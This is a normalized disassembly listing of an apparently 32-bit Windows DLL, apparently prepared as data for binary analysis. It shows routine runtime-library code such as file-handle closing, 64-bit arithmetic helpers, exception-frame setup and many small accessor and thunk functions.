mov [ eax ] ebx
call sub_100417ee
mov [ eax ] 0x9
jmp r-xdata
call sub_100417ba
mov [ eax ] ebx
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x5
mov edi esi
and edi 0x1f
shl edi 0x6
mov eax [ ebx * 4 + rw-data ]
movsx eax [ eax + edi + 0x4 ]
and eax 0x1
jne r-xdata
push esi
call sub_100487ba
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_100417ba
and [ eax ] 0x0
jmp r-xdata
call sub_100417ee
mov [ eax ] 0x9
or edi 0xffffffff
push esi
call sub_1004b03a
pop ecx
mov edi eax
jmp r-xdata
call sub_100417ee
mov [ eax ] 0x9
call sub_1003fe28
call sub_1003f1c5
retn
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1004b012
mov eax edi
jmp r-xdata
sub_1004b03a
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
call sub_100488ce
pop ecx
cmp eax 0xffffffff
je r-xdata
xor esi esi
mov eax [ rw-data ]
cmp edi 0x1
jne r-xdata
xor eax eax
push esi
call sub_100417cd
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp edi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push edi
call sub_100488ce
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_100488ce
push 0x1
mov esi eax
call sub_100488ce
pop ecx
pop ecx
cmp eax esi
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
jmp r-xdata
push edi
call sub_10048848
pop ecx
mov ecx edi
and edi 0x1f
sar ecx 0x5
shl edi 0x6
mov ecx [ ecx * 4 + rw-data ]
mov [ ecx + edi + 0x4 ] 0x0
test esi esi
je r-xdata
sub_1004b0d4
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test [ esi + 0xc ] 0x83
je r-xdata
pop esi
pop ebp
retn
test [ esi + 0xc ] 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_1003f3e3
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_1004b110
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_1004b160
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_10053840
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b454
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov [ rw-data ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_10053890
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b484
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov [ rw-data ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_10001140
retn
sub_10001150
mov [ ecx ] r--data
retn
sub_10001190
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_10001210
mov eax r--data
retn
sub_10001370
mov eax r--data
retn
sub_10001460
mov eax r--data
retn
sub_10001550
mov eax [ ecx + 0x4 ]
retn
sub_10001560
mov eax [ ecx + 0x70 ]
retn
sub_10001570
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x6c ] eax
pop ebp
retn 0x4
sub_10001580
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x78 ] eax
pop ebp
retn 0x4
sub_10001cf7
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0x2
inc eax
push eax
lea ecx [ ebp + 0xb ]
call sub_10001de0
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
sub_10001e10
mov [ ecx ] r--data
retn
sub_10002680
mov edx [ ecx + 0x50 ]
mov eax 0x2aaaaaab
sub edx [ ecx + 0x4c ]
imul edx
sar edx 0x1
mov eax edx
shr eax 0x1f
add eax edx
retn
sub_100026a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
lea edx [ eax + eax * 2 ]
mov eax [ ecx + 0x4c ]
mov ax [ eax + edx * 4 ]
pop ebp
retn 0x4
sub_100026c0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
lea edx [ eax + eax * 2 ]
mov eax [ ecx + 0x4c ]
mov ecx [ eax + edx * 4 + 0x4 ]
mov eax [ ecx ]
call [ eax + 0xc ]
pop ebp
retn 0x4
sub_10002780
mov edx [ ecx + 0x38 ]
mov eax 0x2aaaaaab
sub edx [ ecx + 0x34 ]
imul edx
sar edx 0x1
mov eax edx
shr eax 0x1f
add eax edx
retn
sub_100035f0
mov [ ecx + 0x68 ] 0x0
mov [ ecx + 0x4 ] 0x0
retn
sub_100038c0
mov ecx [ ebp - 0x14 ]
call sub_100036e0
push 0x0
push 0x0
call sub_1003e35b
int3
sub_10003b00
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov eax ecx
retn
mov eax [ ecx ]
retn
sub_10003e62
push [ ebp - 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x0
push 0x0
call sub_1003e35b
int3
sub_10003f41
push [ ebp - 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x0
push 0x0
call sub_1003e35b
int3
sub_10003fe9
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x2
inc eax
push eax
call sub_100040e0
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
sub_100041e4
push 0x0
push 0x0
call sub_1003e35b
int3
sub_1000426f
push 0x0
push 0x0
call sub_1003e35b
int3
sub_10004280
mov [ ecx ] r--data
retn
sub_10004951
mov ecx [ ebp - 0x14 ]
call sub_10004970
push 0x0
push 0x0
call sub_1003e35b
int3
sub_10004b2f
mov ecx [ ebp - 0x18 ]
call sub_10004970
push 0x0
push 0x0
call sub_1003e35b
int3
sub_10005560
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push 0x4ce
push [ ebp + 0x8 ]
call sub_1003cf80
add esp 0x10
pop ebp
retn
sub_10005ea0
mov [ ecx ] r--data
retn
sub_10006660
mov [ ecx ] r--data
retn
sub_10009720
push [ ecx ]
call j_sub_1003f3e3#2
pop ecx
retn
sub_1000987a
push [ ebp - 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x0
push 0x0
call sub_1003e35b
int3
sub_100099b9
push [ ebp + 0xc ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x0
push 0x0
call sub_1003e35b
int3
sub_10009a7c
push [ ebp + 0xc ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x0
push 0x0
call sub_1003e35b
int3
sub_1000b080
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push 0x68f
push [ ebp + 0x8 ]
call sub_1003cf80
add esp 0x10
pop ebp
retn
sub_1000c340
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push 0x438
push [ ebp + 0x8 ]
call sub_1003cf80
add esp 0x10
pop ebp
retn
sub_1000cfe2
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x1c ] eax
mov eax 0x1
retn
sub_1000d830
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push 0x481
push [ ebp + 0x8 ]
call sub_1003cf80
add esp 0x10
pop ebp
retn
sub_1000d850
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push 0x594
push [ ebp + 0x8 ]
call sub_1003cf80
add esp 0x10
pop ebp
retn
sub_1000dc00
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push 0x421
push [ ebp + 0x8 ]
call sub_1003cf80
add esp 0x10
pop ebp
retn
sub_1000dd80
mov eax [ ecx + 0x20 ]
retn
sub_1000e120
mov eax [ ecx + 0x40 ]
retn
sub_10010b00
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push 0x478
push [ ebp + 0x8 ]
call sub_1003cf80
add esp 0x10
pop ebp
retn
sub_10012540
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push 0x42c
push [ ebp + 0x8 ]
call sub_1003cf80
add esp 0x10
pop ebp
retn
sub_100129f0
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push 0x477
push [ ebp + 0x8 ]
call sub_1003cf80
add esp 0x10
pop ebp
retn
sub_10013260
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push 0x68a
push [ ebp + 0x8 ]
call sub_1003cf80
add esp 0x10
pop ebp
retn
sub_10014960
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push 0x708
push [ ebp + 0x8 ]
call sub_1003cf80
add esp 0x10
pop ebp
retn
sub_100153a0
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push 0x752
push [ ebp + 0x8 ]
call sub_1003cf80
add esp 0x10
pop ebp
retn
sub_10015480
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ebp + 0xc ]
cmp ecx [ eax ]
sbb eax eax
neg eax
pop ebp
retn
sub_100165c6
push [ ebp - 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x0
push 0x0
call sub_1003e35b
int3
sub_100165e0
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push 0x5a3
push [ ebp + 0x8 ]
call sub_1003cf80
add esp 0x10
pop ebp
retn
sub_10018080
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push 0x55f
push [ ebp + 0x8 ]
call sub_1003cf80
add esp 0x10
pop ebp
retn
sub_10018340
mov eax [ ecx - 0xc ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0xc ] r--data
mov eax [ ecx - 0xc ]
mov edx [ eax + 0x4 ]
lea eax [ edx - 0xc ]
mov [ edx + ecx - 0x10 ] eax
retn
sub_10018360
mov al [ ecx - 0x8 ]
retn
sub_100183b0
mov eax [ ecx - 0x4 ]
mov [ ecx - 0x8 ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x4 ] r--data
retn
sub_10018550
mov al [ ecx - 0x10 ]
retn
sub_10018560
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x8000000a
jne r-xdata
xor eax eax
pop ebp
retn 0x4
lea eax [ ecx - 0x10 ]
pop ebp
retn 0x4
sub_10018bfd
sub ecx [ ecx - 0x4 ]
jmp sub_10018550
sub_10018c05
sub ecx [ ecx - 0x4 ]
jmp sub_10018660
sub_10018c0d
sub ecx [ ecx - 0x4 ]
jmp sub_10018360
sub_10018c15
sub ecx [ ecx - 0x4 ]
add ecx 0x1c
jmp sub_10018360
sub_10018c20
sub ecx [ ecx - 0x4 ]
sub ecx 0x4
jmp sub_10018360
sub_10018c2b
sub ecx [ ecx - 0x4 ]
jmp sub_10018580
sub_10018c33
sub ecx [ ecx - 0x4 ]
mov eax [ ecx - 0x4c ]
add ecx [ eax + 0xc ]
add ecx 0xffffffcc
jmp sub_10018550
sub_10018c44
sub ecx [ ecx - 0x4 ]
jmp sub_10018370
sub_10018c4c
sub ecx [ ecx - 0x4 ]
jmp sub_10018830
sub_10018c54
sub ecx [ ecx - 0x4 ]
jmp sub_10018560
sub_10018c60
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x8000000d
jne r-xdata
xor eax eax
pop ebp
retn 0x4
lea eax [ ecx - 0x84 ]
pop ebp
retn 0x4
sub_10018c80
mov eax [ ecx - 0x84 ]
mov edx [ ecx - 0x80 ]
retn
sub_100191a6
sub ecx [ ecx - 0x4 ]
jmp sub_10018c80
sub_100191ae
sub ecx [ ecx - 0x4 ]
sub ecx 0x78
jmp sub_10018360
sub_100191b9
sub ecx [ ecx - 0x4 ]
jmp sub_10018e00
sub_100191c1
sub ecx [ ecx - 0x4 ]
jmp sub_10018c60
sub_100191d0
mov [ ecx ] r--data
retn
sub_10019270
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100194e0
mov eax [ ebp + 0xc ]
pop ebp
retn 0x8
sub_10019290
push ebp
mov ebp esp
push 0x1
lea eax [ ebp + 0x8 ]
push eax
call sub_100194e0
pop ebp
retn 0x4
sub_10019c1a
push [ ebp - 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x0
push 0x0
call sub_1003e35b
int3
sub_10019cab
push [ ebp + 0xc ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x0
push 0x0
call sub_1003e35b
int3
sub_1001a450
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
xor ecx ecx
cmp al 0xd
sete cl
mov eax ecx
pop ebp
retn 0x4
sub_1001a980
mov [ ecx ] r--data
retn
sub_1001a9c0
mov eax [ ecx + 0x1c ]
retn
sub_1001aa50
mov eax [ ecx + 0x38 ]
retn
sub_1001aa60
mov al [ ecx + 0x3c ]
retn
sub_1001aad0
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x1
sete al
pop ebp
retn 0x4
sub_1001aaf0
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x2
sete al
pop ebp
retn 0x4
sub_1001ab10
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x12
sete al
pop ebp
retn 0x4
sub_1001ab30
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x3
sete al
pop ebp
retn 0x4
sub_1001ab50
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x5
sete al
pop ebp
retn 0x4
sub_1001ab70
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x13
sete al
pop ebp
retn 0x4
sub_1001ab90
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0xc
sete al
pop ebp
retn 0x4
sub_1001abb0
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0xd
sete al
pop ebp
retn 0x4
sub_1001abd0
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0xb
sete al
pop ebp
retn 0x4
sub_1001abf0
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x14
sete al
pop ebp
retn 0x4
sub_1001ac10
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x6
sete al
pop ebp
retn 0x4
sub_1001ac30
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x7
sete al
pop ebp
retn 0x4
sub_1001ac50
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x4
sete al
pop ebp
retn 0x4
sub_1001ac70
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x15
sete al
pop ebp
retn 0x4
sub_1001ac90
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0xa
sete al
pop ebp
retn 0x4
sub_1001acb0
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x8
sete al
pop ebp
retn 0x4
sub_1001acd0
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x9
sete al
pop ebp
retn 0x4
sub_1001acf0
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0xe
sete al
pop ebp
retn 0x4
sub_1001ad10
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0xf
sete al
pop ebp
retn 0x4
sub_1001ad30
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x10
sete al
pop ebp
retn 0x4
sub_1001ad50
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x11
sete al
pop ebp
retn 0x4
sub_1001ad70
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x19
sete al
pop ebp
retn 0x4
sub_1001ad90
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x18
sete al
pop ebp
retn 0x4
sub_1001adb0
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x16
sete al
pop ebp
retn 0x4
sub_1001add0
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x17
sete al
pop ebp
retn 0x4
sub_1001adf0
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
pop ebp
retn 0x1c
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001bee0
push ebp
mov ebp esp
mov edx ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov [ ebp + 0x8 ] edx
pop ebp
jmp [ eax ]
sub_1001c690
push esi
mov esi ecx
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi ] 0x0
pop esi
retn
sub_1001c6b0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ecx + 0xc ]
mov ecx [ ecx ]
mov [ eax + 0x4 ] 0x0
mov [ eax ] ecx
mov [ eax + 0x8 ] edx
pop ebp
retn 0x4
sub_1001c8f0
mov eax [ ecx - 0x4 ]
mov [ ecx - 0x8 ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x4 ] r--data
retn
sub_1001caa0
mov eax [ ecx - 0x1c ]
mov edx [ ecx - 0x18 ]
retn
sub_1001cab0
mov ax [ ecx - 0x14 ]
retn
sub_1001cac0
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x8000000c
jne r-xdata
xor eax eax
pop ebp
retn 0x4
lea eax [ ecx - 0x1c ]
pop ebp
retn 0x4
sub_10023677
sub ecx [ ecx - 0x4 ]
jmp sub_1000a2e0
sub_1002367f
sub ecx [ ecx - 0x4 ]
jmp sub_10010ef0
sub_10023687
sub ecx [ ecx - 0x4 ]
jmp sub_10012560
sub_1002368f
sub ecx [ ecx - 0x4 ]
sub ecx 0x18
jmp sub_1001cac0
sub_1002369a
sub ecx [ ecx - 0x4 ]
jmp sub_1001cab0
sub_100236a2
sub ecx [ ecx - 0x4 ]
sub ecx 0x38
jmp sub_1001cac0
sub_100236ad
sub ecx [ ecx - 0x4 ]
mov eax [ ecx - 0x2c ]
add ecx [ eax + 0xc ]
add ecx 0xfffffff8
jmp sub_1001cab0
sub_100236be
sub ecx [ ecx - 0x4 ]
jmp sub_10020820
sub_100236c6
sub ecx [ ecx - 0x4 ]
mov eax [ ecx - 0x74 ]
add ecx [ eax + 0xc ]
add ecx 0xffffffb0
jmp sub_1001caa0
sub_100236d7
sub ecx [ ecx - 0x4 ]
mov eax [ ecx - 0x6c ]
add ecx [ eax + 0xc ]
add ecx 0xffffffb0
jmp sub_1001cac0
sub_100236e8
sub ecx [ ecx - 0x4 ]
jmp sub_100202d0
sub_100236f0
sub ecx [ ecx - 0x4 ]
jmp sub_10011280
sub_100236f8
sub ecx [ ecx - 0x4 ]
mov eax [ ecx - 0x38 ]
add ecx [ eax + 0xc ]
add ecx 0xffffffec
jmp sub_1001caa0
sub_10023709
sub ecx [ ecx - 0x4 ]
mov eax [ ecx - 0x30 ]
add ecx [ eax + 0xc ]
add ecx 0xffffffec
jmp sub_1001cac0
sub_1002371a
sub ecx [ ecx - 0x4 ]
jmp sub_1001ea40
sub_10023722
sub ecx [ ecx - 0x4 ]
mov eax [ ecx - 0x10 ]
add ecx [ eax + 0xc ]
add ecx 0x14
jmp sub_1001cab0
sub_10023733
sub ecx [ ecx - 0x4 ]
jmp sub_10021000
sub_1002373b
sub ecx [ ecx - 0x4 ]
jmp sub_100154a0
sub_10023743
sub ecx [ ecx - 0x4 ]
jmp sub_1001edb0
sub_1002374b
sub ecx [ ecx - 0x4 ]
jmp sub_1000e3a0
sub_10023753
sub ecx [ ecx - 0x4 ]
add ecx 0x20
jmp sub_10018360
sub_1002375e
sub ecx [ ecx - 0x4 ]
jmp sub_1001f160
sub_10023766
sub ecx [ ecx - 0x4 ]
jmp sub_10010490
sub_1002376e
sub ecx [ ecx - 0x4 ]
jmp sub_1001de90
sub_10023776
sub ecx [ ecx - 0x4 ]
jmp sub_1001cac0
sub_1002377e
sub ecx [ ecx - 0x4 ]
jmp sub_1001f6a0
sub_10023786
sub ecx [ ecx - 0x4 ]
mov eax [ ecx - 0x3c ]
add ecx [ eax + 0xc ]
add ecx 0xffffffe8
jmp sub_1001caa0
sub_10023797
sub ecx [ ecx - 0x4 ]
mov eax [ ecx - 0x34 ]
add ecx [ eax + 0xc ]
add ecx 0xffffffe8
jmp sub_1001cac0
sub_100237a8
sub ecx [ ecx - 0x4 ]
jmp sub_100132e0
sub_100237b0
sub ecx [ ecx - 0x4 ]
jmp sub_1001d950
sub_100237b8
sub ecx [ ecx - 0x4 ]
jmp sub_1001ccb0
sub_100237c0
sub ecx [ ecx - 0x4 ]
mov eax [ ecx - 0x74 ]
add ecx [ eax + 0xc ]
add ecx 0xffffffb0
jmp sub_1001cab0
sub_100237d1
sub ecx [ ecx - 0x4 ]
jmp sub_10014aa0
sub_100237d9
sub ecx [ ecx - 0x4 ]
mov eax [ ecx - 0x40 ]
add ecx [ eax + 0xc ]
add ecx 0xffffffe4
jmp sub_1001caa0
sub_100237ea
sub ecx [ ecx - 0x4 ]
mov eax [ ecx - 0x38 ]
add ecx [ eax + 0xc ]
add ecx 0xffffffe4
jmp sub_1001cac0
sub_100237fb
sub ecx [ ecx - 0x4 ]
mov eax [ ecx - 0x38 ]
add ecx [ eax + 0xc ]
add ecx 0xffffffec
jmp sub_1001cab0
sub_1002380c
sub ecx [ ecx - 0x4 ]
jmp sub_100179b0
sub_10023814
sub ecx [ ecx - 0x4 ]
jmp sub_1000b7a0
sub_1002381c
sub ecx [ ecx - 0x4 ]
jmp sub_1001fb60
sub_10023824
sub ecx [ ecx - 0x4 ]
jmp sub_1000c360
sub_1002382c
sub ecx [ ecx - 0x4 ]
jmp sub_1001d6b0
sub_10023834
sub ecx [ ecx - 0x4 ]
jmp sub_10011350
sub_1002383c
sub ecx [ ecx - 0x4 ]
jmp sub_1001e760
sub_10023844
sub ecx [ ecx - 0x4 ]
sub ecx 0x18
jmp sub_1001caa0
sub_1002384f
sub ecx [ ecx - 0x4 ]
jmp sub_1000bab0
sub_10023857
sub ecx [ ecx - 0x4 ]
jmp sub_1000c750
sub_1002385f
sub ecx [ ecx - 0x4 ]
sub ecx 0x38
jmp sub_1001caa0
sub_1002386a
sub ecx [ ecx - 0x4 ]
mov eax [ ecx - 0x44 ]
add ecx [ eax + 0xc ]
add ecx 0xffffffe0
jmp sub_1001caa0
sub_1002387b
sub ecx [ ecx - 0x4 ]
mov eax [ ecx - 0x3c ]
add ecx [ eax + 0xc ]
add ecx 0xffffffe0
jmp sub_1001cac0
sub_1002388c
sub ecx [ ecx - 0x4 ]
sub ecx 0x28
jmp sub_10018360
sub_10023897
sub ecx [ ecx - 0x4 ]
sub ecx 0x48
jmp sub_10018360
sub_100238a2
sub ecx [ ecx - 0x4 ]
mov eax [ ecx - 0x3c ]
add ecx [ eax + 0xc ]
add ecx 0xffffffe8
jmp sub_1001cab0
sub_100238b3
sub ecx [ ecx - 0x4 ]
jmp sub_10020a20
sub_100238bb
sub ecx [ ecx - 0x4 ]
jmp sub_1000d370
sub_100238c3
sub ecx [ ecx - 0x4 ]
jmp sub_1001fe60
sub_100238cb
sub ecx [ ecx - 0x4 ]
mov eax [ ecx - 0x28 ]
add ecx [ eax + 0xc ]
add ecx 0xfffffffc
jmp sub_1001caa0
sub_100238dc
sub ecx [ ecx - 0x4 ]
jmp sub_10009b20
sub_100238e4
sub ecx [ ecx - 0x4 ]
mov eax [ ecx - 0x20 ]
add ecx [ eax + 0xc ]
add ecx 0xfffffffc
jmp sub_1001cac0
sub_100238f5
sub ecx [ ecx - 0x4 ]
jmp sub_1000d870
sub_100238fd
sub ecx [ ecx - 0x4 ]
mov eax [ ecx - 0x48 ]
add ecx [ eax + 0xc ]
add ecx 0xffffffdc
jmp sub_1001caa0
sub_1002390e
sub ecx [ ecx - 0x4 ]
mov eax [ ecx - 0x40 ]
add ecx [ eax + 0xc ]
add ecx 0xffffffdc
jmp sub_1001cac0
sub_1002391f
sub ecx [ ecx - 0x4 ]
jmp sub_1001e520
sub_10023927
sub ecx [ ecx - 0x4 ]
mov eax [ ecx - 0x40 ]
add ecx [ eax + 0xc ]
add ecx 0xffffffe4
jmp sub_1001cab0
sub_10023938
sub ecx [ ecx - 0x4 ]
jmp sub_1000b0a0
sub_10023940
sub ecx [ ecx - 0x4 ]
jmp sub_1001d190
sub_10023948
sub ecx [ ecx - 0x4 ]
jmp sub_1001db90
sub_10023950
sub ecx [ ecx - 0x4 ]
jmp sub_1001caa0
sub_10023958
sub ecx [ ecx - 0x4 ]
jmp sub_1001f3c0
sub_10023960
sub ecx [ ecx - 0x4 ]
mov eax [ ecx - 0x2c ]
add ecx [ eax + 0xc ]
add ecx 0xfffffff8
jmp sub_1001caa0
sub_10023971
sub ecx [ ecx - 0x4 ]
mov eax [ ecx - 0x24 ]
add ecx [ eax + 0xc ]
add ecx 0xfffffff8
jmp sub_1001cac0
sub_10023982
sub ecx [ ecx - 0x4 ]
sub ecx 0x10
jmp sub_10018360
sub_1002398d
sub ecx [ ecx - 0x4 ]
jmp sub_1001f980
sub_10023995
sub ecx [ ecx - 0x4 ]
sub ecx 0x18
jmp sub_1001cab0
sub_100239a0
sub ecx [ ecx - 0x4 ]
jmp sub_1000cb60
sub_100239a8
sub ecx [ ecx - 0x4 ]
jmp sub_10012a10
sub_100239b0
sub ecx [ ecx - 0x4 ]
sub ecx 0x38
jmp sub_1001cab0
sub_100239bb
sub ecx [ ecx - 0x4 ]
mov eax [ ecx - 0x44 ]
add ecx [ eax + 0xc ]
add ecx 0xffffffe0
jmp sub_1001cab0
sub_100239cc
sub ecx [ ecx - 0x4 ]
jmp sub_1001e1f0
sub_100239d4
sub ecx [ ecx - 0x4 ]
mov eax [ ecx - 0x10 ]
add ecx [ eax + 0xc ]
add ecx 0x14
jmp sub_1001caa0
sub_100239e5
sub ecx [ ecx - 0x4 ]
mov eax [ ecx - 0x8 ]
add ecx [ eax + 0xc ]
add ecx 0x14
jmp sub_1001cac0
sub_100239f6
sub ecx [ ecx - 0x4 ]
jmp sub_100119b0
sub_100239fe
sub ecx [ ecx - 0x4 ]
jmp sub_1001cfb0
sub_10023a06
sub ecx [ ecx - 0x4 ]
jmp sub_100180a0
sub_10023a0e
sub ecx [ ecx - 0x4 ]
jmp sub_10020d20
sub_10023a16
sub ecx [ ecx - 0x4 ]
jmp sub_10020640
sub_10023a1e
sub ecx [ ecx - 0x4 ]
mov eax [ ecx - 0x28 ]
add ecx [ eax + 0xc ]
add ecx 0xfffffffc
jmp sub_1001cab0
sub_10023a2f
sub ecx [ ecx - 0x4 ]
jmp sub_1001cae0
sub_10023a37
